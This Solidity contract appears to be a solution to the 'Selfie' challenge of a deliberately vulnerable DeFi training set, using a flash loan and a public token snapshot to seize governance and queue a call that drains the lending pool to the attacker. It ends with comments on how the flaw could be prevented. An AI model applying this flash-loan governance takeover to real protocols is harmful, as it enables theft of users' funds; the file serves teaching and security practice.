// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    address attacker;
    uint256 public id;

    constructor (SimpleGovernance _governance, SelfiePool _pool, DamnValuableTokenSnapshot _token, address _attacker) {
        governance = _governance;
        pool = _pool;
        token = _token;
        attacker = _attacker;
    }

    // 1. Take the max amount of flash loan from the pool.
    // 2. Take a token snapshot and take over the governance.
    // 3. Queue an action that drains all funds from the pool.
    // 4. Repay the flash loan.
    // 5. Advance two days in time and execute the action.

    function takeFlashLoan(uint256 _amount) external {
        pool.flashLoan(_amount);
         
    }

    function receiveTokens(address _token,uint256 _amount) external {
        token.snapshot();
        id = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)",attacker), 0);
        token.transfer(msg.sender, _amount);
    }

    // How to avoid??
    // 1. snapshot() shouldn't be called by anyone
    // 2. Along with snapshot, time for which tokens were hold should be taken into account
}
